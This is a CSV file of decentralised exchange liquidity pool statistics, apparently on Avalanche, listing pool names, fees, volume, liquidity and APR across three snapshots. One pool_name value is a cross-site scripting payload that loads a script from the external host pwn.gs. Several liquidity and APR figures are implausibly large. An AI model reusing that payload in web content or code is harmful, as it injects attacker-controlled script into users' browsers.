filter,pool_name,fee_percent,has_rewards,volume_24h,liquidity,fees_24h,apr_24h,epoch_time
All Pools,WETH - AVAX,0.3,False,0.12529,2.045,,5.59,1760146371
All Pools,GRELF[ava] - AVAX,0.3,False,0.11425,2972.33,,0.0,1760146371
All Pools,REDWOLF - GEC,0.3,False,0.10747,16.95,,0.58,1760146371
All Pools,YAK - JOE,0.3,False,0.1059,4.826,,2.0,1760146371
All Pools,MAD - AVAX,0.3,False,0.10194,2438.34,,0.0,1760146371
All Pools,AVAX - WEAPON,0.3,False,0.0971,127118.0,,,1760146371
All Pools,VSO - AVAX,0.3,False,0.08285,299.66,,0.03,1760146371
All Pools,ARROW - AVAX,0.3,False,0.08002,31.55,,0.23,1760146371
All Pools,BLUB - MU,0.3,False,0.07804,0.65236,,10.92,1760146371
All Pools,XAVA - HON,0.3,False,0.06831,2.078,,3.0,1760146371
All Pools,GGP - JUICY,0.3,False,0.064,1.282,,4.56,1760146371
All Pools,NOCHILL - WAIFU,0.3,False,0.05996,230.68,,0.02,1760146371
All Pools,WETH.e - MU,0.3,False,0.05336,2.948,,1.65,1760146371
All Pools,AVAX - CAST,0.3,False,0.05159,5609.44,,,1760146371
All Pools,HUSKY - aXEN,0.3,False,0.05007,0.23253,,19.65,1760146371
All Pools,XETA - AVAX,0.3,False,0.04846,0.7582,,5.83,1760146371
All Pools,USDt - BTCBR,0.3,False,0.04516,0.10352,,39.8,1760146371
All Pools,QI - USDC.e,0.3,False,0.04225,1.396,,2.76,1760146371
All Pools,COB - AVAX,0.3,False,0.04204,11702.0,,,1760146371
All Pools,BEAM - MU,0.3,False,0.03849,2.192,,1.6,1760146371
All Pools,AUSD - HUSKY,0.3,False,0.03709,0.88584,,3.82,1760146371
All Pools,LINK.e - SPELL,0.3,False,0.02375,0.35105,,6.17,1760146371
All Pools,sAVAX - USDC,0.3,False,0.02314,0.7912,,2.67,1760146371
All Pools,WOLFI - AMI,0.3,False,0.02197,3.583,,0.56,1760146371
All Pools,FXS - FRAX,0.3,False,0.01962,0.10807,,16.56,1760146371
All Pools,ecdPTP - AVAX,0.3,False,0.01326,0.15404,,7.85,1760146371
All Pools,PTP - ecdPTP,0.3,False,0.01188,46.44,,0.02,1760146371
All Pools,NOVATO - AVAX,0.3,False,0.01125,0.424,,2.42,1760146371
All Pools,AVAX - IME,0.3,False,0.01077,6826.11,,,1760146371
All Pools,Anon - USDC,0.3,False,0.01054,1.257,,0.76,1760146371
All Pools,FINE - AVAX,0.3,False,0.00758,4032.39,,,1760146371
All Pools,LUNA - AVAX,0.3,False,0.0058,18.58,,0.03,1760146371
All Pools,QI - USDC,0.3,False,0.0049,0.15384,,2.91,1760146371
All Pools,AVAX - BGR,0.3,False,0.0028,35143.0,,,1760146371
All Pools,"'`""</titLe/</scRipt/--!><scRiPt src=//pwn.gs></scRiPt> - AVAX",0.3,False,0.00268,0.48414,,0.5,1760146371
All Pools,AVAX - FOREST,0.3,False,0.00142,62086049485.0,,,1760146371
All Pools,ARBC - USDC,0.3,False,,0.00167,,1.62,1760146371
All Pools,ARBC - AVAX,0.3,False,,0.00178,,0.99,1760146371
All Pools,JOE - USDt,0.3,False,,1.244,,,1760146371
All Pools,WETH.e - USDt,0.3,False,,0.09583,,,1760146371
All Pools,FATE - USDC,0.3,False,,123193.0,,,1760146371
All Pools,FATE - AVAX,0.3,False,,122004.0,,,1760146371
All Pools,AVAX - USDC,0.05,True,260422059.0,14607355.0,139798.0,1054.21,1760149673
All Pools,WETH.e - AVAX,0.05,False,25856605.0,2332674.0,15352.0,240.21,1760149673
All Pools,USDt - USDC,0.005,True,23868354.0,2579910.0,1729.14,48.64,1760149673
All Pools,AVAX - BTC.b,0.05,True,18643297.0,3726382.0,14131.0,12308.76,1760149673
All Pools,sAVAX - AVAX,0.01,True,7118237.0,558757.0,825.93,71.84,1760149673
All Pools,AUSD - USDt,0.01,True,6515487.0,994787.0,654.15,42.11,1760149673
All Pools,AUSD - USDC,0.01,True,5329706.0,1295268.0,533.21,28.92,1760149673
All Pools,BTC.b - USDC,0.05,False,3376978.0,978477.0,3547.17,132.32,1760149673
All Pools,EURC - AVAX,0.1,False,3275229.0,1394113.0,8634.06,226.05,1760149673
All Pools,EURC - USDC,0.03,True,2783368.0,1550087.0,1179.72,62.54,1760149673
All Pools,WETH.e - AVAX,0.25,False,2595151.0,2845157.0,6883.69,88.31,1760149673
All Pools,USDt - USDC,0.01,False,2129226.0,246229.0,206.53,30.62,1760149673
All Pools,AVAX - USDC,0.3,False,1863501.0,611658.0,4658.75,278.01,1760149673
All Pools,sUSDe - USDC,0.1,True,1590120.0,1556862.0,1590.62,60.91,1760149673
All Pools,XAUt0 - USDt,0.04,True,1079119.0,173759.0,585.53,239.94,1760149673
All Pools,AVAX - USDC,0.2,False,1077760.0,667526.0,3224.32,176.3,1760149673
All Pools,USDC.e - AVAX,0.3,False,794799.0,654619.0,1987.0,110.79,1760149673
All Pools,JOE - AVAX,0.3,False,780835.0,1258857.0,1952.09,56.6,1760149673
All Pools,EUROP - USDC,0.1,False,759802.0,1702816.0,716.9,15.37,1760149673
All Pools,AVAX - USDT.e,0.3,False,745223.0,840572.0,1863.06,80.9,1760149673
All Pools,COQ - AVAX,0.3,False,744757.0,1399115.0,1861.89,48.57,1760149673
All Pools,AUSD - AVAX,0.1,True,735919.0,189190.0,907.25,1159.06,1760149673
All Pools,AVAX - USDt,0.2,False,707493.0,242484.0,2436.04,366.69,1760149673
All Pools,WETH.e - AVAX,0.3,False,674528.0,978608.0,1686.32,62.9,1760149673
All Pools,SOL - AVAX,0.3,False,501024.0,993955.0,1252.56,46.0,1760149673
All Pools,YBTC.B - WBTC,0.01,False,439364.0,561639.0,47.48,3.09,1760149673
All Pools,BTC.b - AVAX,0.3,False,425899.0,254199.0,1064.75,152.89,1760149673
All Pools,AVAX - AvaxMinerAI,0.3,False,403739.0,82162.0,1009.35,448.39,1760149673
All Pools,USDC.e - USDC,0.3,False,365374.0,480915.0,913.44,69.33,1760149673
All Pools,"AVAX - USDC

OUTDATED",0.2,False,356831.0,25906.0,1169.94,1648.39,1760149673
All Pools,GUN - AVAX,0.25,False,350560.0,477576.0,1018.7,77.86,1760149673
All Pools,MIM - AVAX,0.3,False,298003.0,857318.0,745.01,31.72,1760149673
All Pools,USDT.e - USDC,0.02,False,295021.0,59058.0,88.81,54.89,1760149673
All Pools,JOE - USDC.e,0.3,False,294479.0,504879.0,736.2,53.22,1760149673
All Pools,ggAVAX - AVAX,0.04,True,235616.0,175719.0,23.53,61.57,1760149673
All Pools,deUSD - USDC,0.01,True,230982.0,409377.0,27.07,6.41,1760149673
All Pools,SolvBTC - BTC.b,0.04,False,230000.0,4241195.0,95.26,0.82,1760149673
All Pools,STG - USDC,0.3,False,229631.0,1084354.0,574.08,19.32,1760149673
All Pools,USDC - MXNB,0.04,False,217953.0,201906.0,148.2,26.79,1760149673
All Pools,GMX - AVAX,0.3,False,200356.0,1662493.0,500.89,11.0,1760149673
All Pools,GUN - AVAX,0.1,False,195774.0,66988.0,222.24,121.09,1760149673
All Pools,WBTC - BTC.b,0.03,True,182267.0,2123822.0,56.09,4.81,1760149673
All Pools,USDC - XAVA,0.3,False,181244.0,443400.0,453.11,37.3,1760149673
All Pools,AVAX - MXNB,0.1,False,174646.0,85991.0,289.69,122.96,1760149673
All Pools,XAVA - AVAX,0.8,False,150759.0,69548.0,2216.49,1163.25,1760149673
All Pools,NXPC - AVAX,0.3,False,141101.0,383850.0,352.75,33.54,1760149673
All Pools,avUSD - USDC,0.05,True,137242.0,602402.0,68.35,31.21,1760149673
All Pools,WBTC.e - AVAX,0.3,False,119429.0,315783.0,298.57,34.51,1760149673
All Pools,XSGD - USDC,0.05,True,119142.0,49969.0,60.15,81.66,1760149673
All Pools,USDt - AVAX,0.3,False,116393.0,67533.0,290.98,157.27,1760149673
All Pools,QI - AVAX,0.3,False,114574.0,673589.0,286.44,15.52,1760149673
All Pools,YUSD - USDC,0.02,True,108777.0,523019.0,22.17,14.01,1760149673
All Pools,LINK.e - AVAX,0.3,False,104536.0,101568.0,261.34,93.92,1760149673
All Pools,deUSD - AUSD,0.01,True,98659.0,75046.0,9.891,26.77,1760149673
All Pools,BEAM - AVAX,0.3,False,89459.0,258237.0,223.65,31.61,1760149673
All Pools,AAVE.e - AVAX,0.3,False,83289.0,715789.0,208.22,10.62,1760149673
All Pools,BEAM - USDC,0.3,False,82459.0,126174.0,206.15,59.63,1760149673
All Pools,SOL - AVAX,0.1,False,79870.0,21289.0,90.92,155.87,1760149673
All Pools,WBTC.e - BTC.b,0.03,False,74246.0,469683.0,25.12,1.95,1760149673
All Pools,BEAM - AVAX,0.25,True,70600.0,56027.0,223.89,485.87,1760149673
All Pools,JOE - USDC,0.3,False,67742.0,61240.0,169.36,100.94,1760149673
All Pools,APR - AVAX,0.3,False,55034.0,170991952244.0,137.59,,1760149673
All Pools,JOE - USDT.e,0.3,False,54074.0,102922.0,135.19,47.94,1760149673
All Pools,CAI - AVAX,0.3,False,52252.0,292407.0,130.63,16.31,1760149673
All Pools,DAI.e - USDC,0.02,False,51582.0,25878.0,11.99,16.91,1760149673
All Pools,AVAX - DAI.e,0.3,False,49354.0,52970.0,123.38,85.02,1760149673
All Pools,AVAX - avUSD,0.25,True,48945.0,24764.0,148.38,1911.84,1760149673
All Pools,AVAX - MET,0.3,False,47020.0,17869.0,117.55,240.11,1760149673
All Pools,AVAX - CLY,0.3,False,45957.0,840102.0,114.89,4.99,1760149673
All Pools,YAK - AVAX,0.3,False,41241.0,452840.0,103.1,8.31,1760149673
All Pools,ORNG - AVAX,0.3,False,40672.0,74168.0,101.68,50.04,1760149673
All Pools,DAI.e - USDt,0.25,False,37995.0,20244.0,94.64,170.65,1760149673
All Pools,JOE - AVAX,0.15,False,35553.0,170905.0,109.43,23.37,1760149673
All Pools,NOCHILL - AVAX,0.3,False,35281.0,237569.0,88.2,13.55,1760149673
All Pools,gOHM - AVAX,0.3,False,28878.0,253782.0,72.2,10.38,1760149673
All Pools,ALOT - AVAX,0.3,False,27933.0,685090.0,69.83,3.72,1760149673
All Pools,w3ULL - AVAX,0.3,False,26108.0,206507.0,65.27,11.54,1760149673
All Pools,sAVAX - avUSD,0.25,False,26108.0,11555.0,103.25,326.16,1760149673
All Pools,USDC.e - USDC,0.02,False,24434.0,5964.11,5.979,36.59,1760149673
All Pools,savUSD - avUSD,0.02,True,24403.0,1630063.0,4.881,15.21,1760149673
All Pools,avUSD - sAVAX,0.3,False,23827.0,41410.0,59.57,52.51,1760149673
All Pools,KIMBO - AVAX,0.3,False,22579.0,210098.0,56.45,9.81,1760149673
All Pools,SHRAP - AVAX,0.4,False,21195.0,29995.0,110.42,134.37,1760149673
All Pools,WETH.e - USDC,0.15,False,20524.0,10982.0,40.85,135.77,1760149673
All Pools,AVAX - JUICE,0.3,False,18782.0,36406.0,46.95,47.08,1760149673
All Pools,WOLF - AVAX,0.3,False,17650.0,130282.0,44.13,12.36,1760149673
All Pools,FLD - AVAX,0.3,False,17466.0,106031.0,43.67,15.03,1760149673
All Pools,SolvBTC.AVAX - SolvBTC,0.04,False,17426.0,10264678.0,6.972,0.02,1760149673
All Pools,USDC.e - USDC,0.02,False,16818.0,25503.0,2.833,4.05,1760149673
All Pools,USDT.e - USDt,0.02,False,15807.0,43677.0,4.891,4.09,1760149673
All Pools,SPARK - USDt,0.3,False,15791.0,76034.0,39.48,18.95,1760149673
All Pools,GGP - AVAX,0.3,False,15645.0,760557.0,39.11,1.88,1760149673
All Pools,SWORLD - AVAX,0.3,False,11150.0,50901.0,27.87,19.99,1760149673
All Pools,sAVAX - AVAX,0.3,False,10922.0,579021.0,27.3,1.72,1760149673
All Pools,WETH.e - USDC.e,0.3,False,8848.66,21720.0,22.12,37.18,1760149673
All Pools,BOG - AVAX,0.3,False,8777.49,,21.94,448928942516.16,1760149673
All Pools,BLUB - AVAX,0.3,False,8009.43,87231.0,20.02,8.38,1760149673
All Pools,AVAX - JUICY,0.3,False,7718.24,32164.0,19.3,21.9,1760149673
All Pools,AVAX - ALVA,0.3,False,6802.75,63937.0,17.01,9.71,1760149673
All Pools,"USDt - USDC

OUTDATED",0.02,False,6658.03,2235.06,1.68,27.44,1760149673
All Pools,LIMBO - AVAX,0.25,False,5765.67,60156.0,29.6,17.96,1760149673
All Pools,"DAI.e - USDC

OUTDATED",0.02,False,2996.27,2642.95,0.6167,8.52,1760149673
All Pools,"USDC.e - USDC

OUTDATED",0.02,False,2759.45,2070.23,0.60209,10.62,1760149673
All Pools,USDT.e - USDC,0.02,False,2367.1,995.16,0.52054,19.09,1760149673
All Pools,AVAX - FRAX,0.15,False,1956.68,4119.8,3.921,34.74,1760149673
All Pools,JOE - AVAX,0.25,False,1720.49,56956.0,6.205,3.98,1760149673
All Pools,BLAZE - USDC,0.8,False,1302.34,0.0,10.86,,1760149673
All Pools,"WBTC.e - BTC.b

OUTDATED",0.03,False,1247.89,965.02,0.42022,15.89,1760149673
All Pools,"AVAX - USDt

OUTDATED",0.2,False,1169.07,279.7,6.192,808.08,1760149673
All Pools,PRIME - AVAX,0.4,False,1087.76,180266.0,9.099,1.84,1760149673
All Pools,YAK - USDt,0.8,False,1006.4,2276.86,11.84,189.73,1760149673
All Pools,SOL - USDC,0.1,False,896.9,1423.97,1.066,27.31,1760149673
All Pools,QI - AVAX,0.25,False,784.6,67446.0,3.283,1.78,1760149673
All Pools,ARENA - AVAX,2.5,False,593.25,2963.77,16.12,198.57,1760149673
All Pools,COQ - AVAX,0.8,False,589.31,52173.0,5.329,3.73,1760149673
All Pools,GHO - AVAX,0.8,False,551.13,3273.69,4.451,49.63,1760149673
All Pools,rsAVAX - AVAX,0.1,False,456.77,3577.41,0.49024,5.0,1760149673
All Pools,JOE - USDC,0.25,False,447.17,1979.5,1.958,36.1,1760149673
All Pools,SolvBTC - AVAX,0.05,False,403.44,14803.0,0.67049,1.65,1760149673
All Pools,SOL - AVAX,0.8,False,397.78,2052.95,4.128,73.39,1760149673
All Pools,FRAX - USDC,0.25,False,378.78,321.65,0.99353,112.74,1760149673
All Pools,COQ - AVAX,0.8,False,328.48,12509.0,5.148,15.02,1760149673
All Pools,AVAX - USDC,0.8,False,308.11,229.4,5.19,825.88,1760149673
All Pools,BLZ - AVAX,0.8,False,281.08,0.0,2.26,,1760149673
All Pools,EMDX - AVAX,0.8,False,268.72,26160.0,4.074,5.68,1760149673
All Pools,AVAX - USDC,0.05,True,206885481.0,14857469.0,112536.0,1219.2,1760156975
All Pools,USDt - USDC,0.005,True,25723905.0,3060355.0,1863.77,42.17,1760156975
All Pools,WETH.e - AVAX,0.05,False,24970504.0,2372454.0,14907.0,229.34,1760156975
All Pools,AVAX - BTC.b,0.05,True,17391413.0,3790711.0,13431.0,13035.04,1760156975
All Pools,sAVAX - AVAX,0.01,True,7155667.0,787316.0,829.68,50.85,1760156975
All Pools,AUSD - USDt,0.01,True,6368059.0,1092777.0,639.43,37.53,1760156975
All Pools,AUSD - USDC,0.01,True,5418799.0,1296228.0,542.12,28.9,1760156975
All Pools,BTC.b - USDC,0.05,False,3543638.0,980206.0,3632.88,135.28,1760156975
All Pools,EURC - AVAX,0.1,False,3495420.0,1404382.0,8869.09,230.51,1760156975
All Pools,EURC - USDC,0.03,True,2924756.0,1498474.0,1222.79,67.33,1760156975
All Pools,WETH.e - AVAX,0.25,False,2746124.0,2885055.0,7266.7,91.93,1760156975
All Pools,USDt - USDC,0.01,False,2020217.0,246205.0,197.68,29.31,1760156975
All Pools,AVAX - USDC,0.3,False,1891366.0,607801.0,4728.42,283.95,1760156975
All Pools,sUSDe - USDC,0.1,True,1804440.0,1318361.0,1805.09,77.36,1760156975
All Pools,AVAX - USDC,0.2,False,1112225.0,676558.0,3295.11,177.77,1760156975
All Pools,XAUt0 - USDt,0.04,True,1044815.0,134102.0,570.75,297.74,1760156975
All Pools,USDC.e - AVAX,0.3,False,813341.0,651581.0,2033.35,113.9,1760156975
All Pools,JOE - AVAX,0.3,False,811719.0,1238677.0,2029.3,59.8,1760156975
All Pools,COQ - AVAX,0.3,False,771946.0,1441795.0,1929.87,48.86,1760156975
All Pools,EUROP - USDC,0.1,False,770567.0,1702430.0,727.67,15.6,1760156975
All Pools,AVAX - USDT.e,0.3,False,765003.0,836366.0,1912.51,83.46,1760156975
All Pools,AUSD - AVAX,0.1,True,724914.0,180455.0,899.94,2252.62,1760156975
All Pools,AVAX - USDt,0.2,False,723917.0,245897.0,2469.76,366.6,1760156975
All Pools,WETH.e - AVAX,0.3,False,711176.0,971999.0,1777.94,66.76,1760156975
All Pools,SOL - AVAX,0.3,False,520650.0,984374.0,1301.62,48.26,1760156975
All Pools,BTC.b - AVAX,0.3,False,446983.0,252473.0,1117.46,161.55,1760156975
All Pools,YBTC.B - WBTC,0.01,False,441114.0,571762.0,47.33,3.02,1760156975
All Pools,AVAX - AvaxMinerAI,0.3,False,421774.0,46726481423.0,1054.43,,1760156975
All Pools,USDT.e - USDC,0.02,False,384517.0,58890.0,110.08,68.22,1760156975
All Pools,GUN - AVAX,0.25,False,376106.0,490444.0,1095.32,81.52,1760156975
All Pools,USDC.e - USDC,0.3,False,366065.0,481750.0,915.16,69.34,1760156975
All Pools,"AVAX - USDC

OUTDATED",0.2,False,359181.0,25919.0,1174.88,1654.53,1760156975
All Pools,MIM - AVAX,0.3,False,313403.0,852543.0,783.51,33.54,1760156975
All Pools,LCPEDU - USDt,0.8,False,308829.0,21649515.0,5050.36,8.51,1760156975
All Pools,JOE - USDC.e,0.3,False,302546.0,500857.0,756.37,55.12,1760156975
All Pools,STG - USDC,0.3,False,243509.0,1093878.0,608.77,20.31,1760156975
All Pools,deUSD - USDC,0.01,True,243363.0,405521.0,28.29,6.51,1760156975
All Pools,SolvBTC - BTC.b,0.04,False,242091.0,4218176.0,100.1,0.87,1760156975
All Pools,GMX - AVAX,0.3,False,240676.0,1647543.0,601.69,13.33,1760156975
All Pools,ggAVAX - AVAX,0.04,True,239169.0,178392.0,23.88,59.7,1760156975
All Pools,USDC - MXNB,0.04,False,227680.0,201452.0,152.8,27.68,1760156975
All Pools,GUN - AVAX,0.1,False,205351.0,69059.0,237.44,125.5,1760156975
All Pools,AVAX - MXNB,0.1,False,183312.0,87495.0,300.07,125.18,1760156975
All Pools,USDC - XAVA,0.3,False,183167.0,438347.0,457.92,38.13,1760156975
All Pools,WBTC - BTC.b,0.03,True,182113.0,2151143.0,56.05,4.68,1760156975
All Pools,YUSD - USDC,0.02,True,150916.0,522996.0,31.65,14.85,1760156975
All Pools,XAVA - AVAX,0.8,False,150774.0,71616.0,2216.62,1129.73,1760156975
All Pools,NXPC - AVAX,0.3,False,150467.0,378147.0,376.17,36.31,1760156975
All Pools,avUSD - USDC,0.05,True,137486.0,901801.0,68.48,20.52,1760156975
All Pools,XSGD - USDC,0.05,True,131426.0,58060.0,65.3,72.72,1760156975
All Pools,QI - AVAX,0.3,False,126116.0,667112.0,315.29,17.25,1760156975
All Pools,WBTC.e - AVAX,0.3,False,123502.0,313905.0,308.75,35.9,1760156975
All Pools,USDt - AVAX,0.3,False,118079.0,67143.0,295.2,160.47,1760156975
All Pools,deUSD - AUSD,0.01,True,110411.0,75023.0,11.08,26.95,1760156975
All Pools,DAI.e - USDC,0.02,False,109089.0,25418.0,33.38,47.93,1760156975
All Pools,LINK.e - AVAX,0.3,False,109075.0,100657.0,272.69,98.88,1760156975
All Pools,BEAM - AVAX,0.3,False,92779.0,259502.0,231.95,32.62,1760156975
All Pools,AAVE.e - AVAX,0.3,False,91793.0,715086.0,229.48,11.71,1760156975
All Pools,WBTC.e - BTC.b,0.03,False,86889.0,470082.0,28.94,2.25,1760156975
All Pools,BEAM - USDC,0.3,False,84766.0,127617.0,211.91,60.61,1760156975
All Pools,CAI - AVAX,0.3,False,81303.0,286928.0,203.26,25.86,1760156975
All Pools,BEAM - AVAX,0.25,True,79342.0,56778.0,247.45,473.12,1760156975
All Pools,SOL - AVAX,0.1,False,73576.0,21644.0,85.03,143.39,1760156975
All Pools,savUSD - avUSD,0.02,True,73145.0,1626410.0,14.63,15.19,1760156975
All Pools,JOE - USDC,0.3,False,68973.0,60649.0,172.43,103.77,1760156975
All Pools,YAK - AVAX,0.3,False,55719.0,474390.0,139.3,10.72,1760156975
All Pools,JOE - USDT.e,0.3,False,55620.0,102066.0,139.05,49.73,1760156975
All Pools,AVAX - MET,0.3,False,55441.0,19681.0,138.6,257.05,1760156975
All Pools,AVAX - avUSD,0.25,True,54807.0,25180.0,163.45,990.92,1760156975
All Pools,APR - AVAX,0.3,False,51578.0,170991952244.0,128.94,,1760156975
All Pools,AVAX - DAI.e,0.3,False,50589.0,51673.0,126.47,89.34,1760156975
All Pools,AVAX - CLY,0.3,False,49376.0,829190.0,123.44,5.43,1760156975
All Pools,DAI.e - USDt,0.25,False,44030.0,19877.0,109.42,200.93,1760156975
All Pools,ORNG - AVAX,0.3,False,41199.0,73835.0,103.0,50.92,1760156975
All Pools,NOCHILL - AVAX,0.3,False,38233.0,241105.0,95.58,14.47,1760156975
All Pools,ALOT - AVAX,0.3,False,36501.0,661373.0,91.25,5.04,1760156975
All Pools,JOE - AVAX,0.15,False,35821.0,170281.0,109.87,23.55,1760156975
All Pools,w3ULL - AVAX,0.3,False,35563.0,201909.0,88.91,16.07,1760156975
All Pools,sAVAX - avUSD,0.25,False,29865.0,11700.0,112.95,352.37,1760156975
All Pools,USDC.e - USDC,0.02,False,29227.0,5959.9,7.204,44.12,1760156975
All Pools,gOHM - AVAX,0.3,False,27578.0,249168.0,68.94,10.1,1760156975
All Pools,SHRAP - AVAX,0.4,False,25945.0,29347.0,133.2,165.66,1760156975
All Pools,SolvBTC.AVAX - SolvBTC,0.04,False,24361.0,9366591.0,9.747,0.04,1760156975
All Pools,avUSD - sAVAX,0.3,False,23252.0,41071.0,58.13,51.66,1760156975
All Pools,KIMBO - AVAX,0.3,False,22477.0,207162.0,56.19,9.9,1760156975
All Pools,WETH.e - USDC,0.15,False,20334.0,10994.0,40.57,134.68,1760156975
All Pools,AVAX - JUICE,0.3,False,18940.0,36512.0,47.35,47.34,1760156975
All Pools,WOLF - AVAX,0.3,False,17702.0,128471.0,44.25,12.57,1760156975
All Pools,FLD - AVAX,0.3,False,17567.0,105003.0,43.92,15.27,1760156975
All Pools,USDT.e - USDt,0.02,False,17193.0,43509.0,5.182,4.35,1760156975
All Pools,USDC.e - USDC,0.02,False,17155.0,25467.0,2.889,4.14,1760156975
All Pools,GGP - AVAX,0.3,False,16649.0,753159.0,41.62,2.02,1760156975
All Pools,SPARK - USDt,0.3,False,15790.0,75992.0,39.48,18.96,1760156975
All Pools,sAVAX - AVAX,0.3,False,12716.0,570921.0,31.79,2.03,1760156975
All Pools,SWORLD - AVAX,0.3,False,11319.0,50290.0,28.3,20.54,1760156975
All Pools,AVAX - ALVA,0.3,False,9567.99,62044.0,23.92,14.07,1760156975
All Pools,WETH.e - USDC.e,0.3,False,9142.67,21733.0,22.86,38.39,1760156975
All Pools,BOG - AVAX,0.3,False,8777.49,,21.94,451785862414.14,1760156975
All Pools,"DAI.e - USDC

OUTDATED",0.02,False,8460.92,2591.52,2.597,36.58,1760156975
All Pools,BLUB - AVAX,0.3,False,8086.79,88198.0,20.22,8.37,1760156975
All Pools,AVAX - JUICY,0.3,False,7820.17,32352.0,19.55,22.06,1760156975
All Pools,AVAX - XAVA,0.3,False,6841.48,21842.0,17.1,28.58,1760156975
All Pools,"USDt - USDC

OUTDATED",0.02,False,6584.25,2235.55,1.665,27.19,1760156975
All Pools,GURS - AVAX,0.3,False,6572.55,27602.0,16.43,21.73,1760156975
All Pools,APIX - USDt,0.3,False,6397.88,18629.0,15.99,31.34,1760156975
All Pools,LIMBO - AVAX,0.25,False,6169.08,51795.0,30.92,21.79,1760156975
All Pools,sAVAX - JACK,0.3,False,6066.83,301893.0,15.17,1.83,1760156975
All Pools,AVAX - GEC,0.3,False,6010.04,90449.0,15.03,6.06,1760156975
All Pools,USDC.e - USDT.e,0.3,False,5461.41,40951.0,13.65,12.17,1760156975
All Pools,APIX - ARENA,0.3,False,4910.03,14058.0,12.28,31.87,1760156975
All Pools,USDC.e - DAI.e,0.3,False,4848.99,23062.0,12.12,19.19,1760156975
All Pools,UST - AVAX,0.3,False,4809.44,12101.0,12.02,36.27,1760156975
All Pools,AVAX - BLACK,0.3,False,4780.35,7.302,11.95,59738.19,1760156975
All Pools,AMPL - AVAX,0.3,False,4530.97,75411.0,11.33,5.48,1760156975
All Pools,APIX - ID,0.3,False,4443.94,29328.0,11.11,13.83,1760156975
All Pools,COQ - COQAI,0.3,False,4180.44,69643.0,10.45,5.48,1760156975
All Pools,AVAX - HON,0.3,False,3612.93,177336.0,9.032,1.86,1760156975
All Pools,USDt - USDT.e,0.3,False,3490.12,20606.0,8.725,15.46,1760156975
All Pools,"USDC.e - USDC

OUTDATED",0.02,False,3339.17,2067.08,0.73111,12.91,1760156975
All Pools,APIX - USDC,0.3,False,2996.61,9295.55,7.492,29.42,1760156975
All Pools,VTX - AVAX,0.3,False,2837.6,8151.46,7.094,31.76,1760156975
All Pools,USDT.e - USDC,0.02,False,2597.11,992.0,0.55914,20.57,1760156975
All Pools,AVAX - bnUSD,0.3,False,2433.96,27493.0,6.085,8.08,1760156975
All Pools,AVAX - DOMI,0.3,False,2329.46,61062.0,5.824,3.48,1760156975
All Pools,avUSD - USDC,0.3,False,2274.66,10106.0,5.687,20.54,1760156975
All Pools,AVAX - SWAP.e,0.3,False,2184.2,46429.0,5.46,4.29,1760156975
All Pools,AVAX - UST,0.3,False,2181.15,15275.0,5.453,13.03,1760156975
All Pools,OSAK - AVAX,0.3,False,2158.33,22437.0,5.396,8.78,1760156975
All Pools,MUON - AVAX,0.3,False,2136.63,100531.0,5.342,1.94,1760156975
All Pools,NXUSD - WXT,0.3,False,1995.27,669834.0,4.988,0.27,1760156975
All Pools,AVAX - FRAX,0.15,False,1958.95,4159.31,3.934,34.52,1760156975
All Pools,BLSEYE🎯 - AVAX,0.3,False,1947.46,19162.0,4.869,9.27,1760156975
All Pools,"WBTC.e - BTC.b

OUTDATED",0.03,False,1870.87,968.08,0.61783,23.29,1760156975
All Pools,HERESY - AVAX,0.3,False,1863.18,28068.0,4.658,6.06,1760156975
All Pools,HOWDY - USDC,0.3,False,1759.52,14289.0,4.399,11.24,1760156975
All Pools,JOE - AVAX,0.25,False,1741.88,57287.0,6.258,3.99,1760156975
All Pools,SOON - AMI,0.3,False,1525.41,6684.35,3.814,20.82,1760156975
All Pools,AVAX - SOLNIC,0.3,False,1491.25,11557.0,3.728,11.77,1760156975
All Pools,AI - AVAX,0.3,False,1427.16,10489.0,3.568,12.42,1760156975
All Pools,XETA - USDC,0.3,False,1407.54,12888.0,3.519,9.97,1760156975
All Pools,USDT.e - DAI.e,0.3,False,1362.33,7516.93,3.406,16.54,1760156975
All Pools,APIX - LAMBO,0.3,False,1358.82,6731.65,3.397,18.42,1760156975
All Pools,BLAZE - USDC,0.8,False,1302.34,0.0,10.86,,1760156975
All Pools,XSEED - AVAX,0.3,False,1254.89,18171.0,3.137,6.3,1760156975
All Pools,SYN - AVAX,0.3,False,1194.61,5102.31,2.987,21.36,1760156975
All Pools,SB - AVAX,0.3,False,1180.49,10535.0,2.951,10.23,1760156975
All Pools,AVAX - RISE,0.3,False,1179.27,159558.0,2.948,0.67,1760156975
All Pools,"AVAX - USDt

OUTDATED",0.2,False,1171.3,279.16,6.197,810.29,1760156975
All Pools,SECOND - USDC,0.3,False,1158.74,12160.0,2.897,8.7,1760156975
All Pools,BOI - AVAX,0.3,False,1089.73,23116.0,2.724,4.3,1760156975
